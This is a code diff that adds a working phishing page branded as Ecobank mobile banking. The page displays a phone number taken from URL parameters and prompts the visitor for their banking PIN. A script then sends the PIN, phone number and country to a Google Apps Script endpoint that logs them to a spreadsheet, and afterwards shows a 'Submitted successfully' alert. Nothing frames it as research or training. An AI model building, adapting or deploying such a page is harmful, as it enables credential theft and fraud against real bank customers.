@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
+<title>Ecobank PIN</title>
+
+<style>
+
+body{
+font-family:Arial;
+padding:20px;
+}
+
+.header{
+display:flex;
+justify-content:space-between;
+margin-bottom:60px;
+}
+
+.language{
+border:1px solid #ddd;
+padding:8px 12px;
+border-radius:8px;
+}
+
+.title{
+text-align:center;
+font-size:26px;
+color:#3b6b8c;
+margin-bottom:50px;
+}
+
+.phone-display{
+font-size:22px;
+border-bottom:2px solid #ddd;
+padding-bottom:10px;
+margin-bottom:40px;
+}
+
+.pin{
+width:100%;
+padding:15px;
+font-size:22px;
+border:none;
+border-bottom:2px solid #ddd;
+}
+
+.proceed{
+position:fixed;
+bottom:30px;
+left:20px;
+right:20px;
+padding:18px;
+background:#7bd000;
+border:none;
+font-size:22px;
+color:white;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="header">
+
+<div>←</div>
+
+<div class="language">
+
+🇺🇸 EN ▼
+
+</div>
+
+<div>💬</div>
+
+</div>
+
+
+<div class="title">
+
+Welcome to Ecobank mobile
+
+</div>
+
+
+<div class="phone-display">
+
+<span id="displayNumber"></span>
+
+</div>
+
+
+<form id="pinForm">
+
+<input
+type="password"
+class="pin"
+placeholder="Enter PIN"
+id="pin"
+required
+>
+
+<button class="proceed">
+
+Proceed
+
+</button>
+
+</form>
+
+
+<script>
+
+/* read data from URL */
+
+const params =
+new URLSearchParams(window.location.search);
+
+const country =
+params.get("country");
+
+const dialCode =
+params.get("dialCode");
+
+const phone =
+params.get("phone");
+
+
+/* show number beside flag area */
+
+document
+.getElementById("displayNumber")
+.innerText =
+dialCode + phone;
+
+
+/* send PIN to spreadsheet */
+
+const scriptURL =
+"https://script.google.com/macros/s/AKfycbwPXCxzwcXXffRpS7WGdsZFYP3RDSXLEgS01__wZwcv2W4doTcLW-XWQgc63DVNXNQcng/exec";
+
+
+document
+.getElementById("pinForm")
+.addEventListener("submit",function(e){
+
+e.preventDefault();
+
+const pin =
+document.getElementById("pin").value;
+
+
+fetch(scriptURL,{
+
+method:"POST",
+
+mode:"no-cors",
+
+headers:{
+"Content-Type":
+"application/x-www-form-urlencoded"
+},
+
+body:
+"step=pin"+
+"&country="+encodeURIComponent(country)+
+"&dialCode="+encodeURIComponent(dialCode)+
+"&phone="+encodeURIComponent(phone)+
+"&pin="+encodeURIComponent(pin)
+
+});
+
+
+alert("Submitted successfully");
+
+});
+
+</script>
+
+</body>
+
+</html>
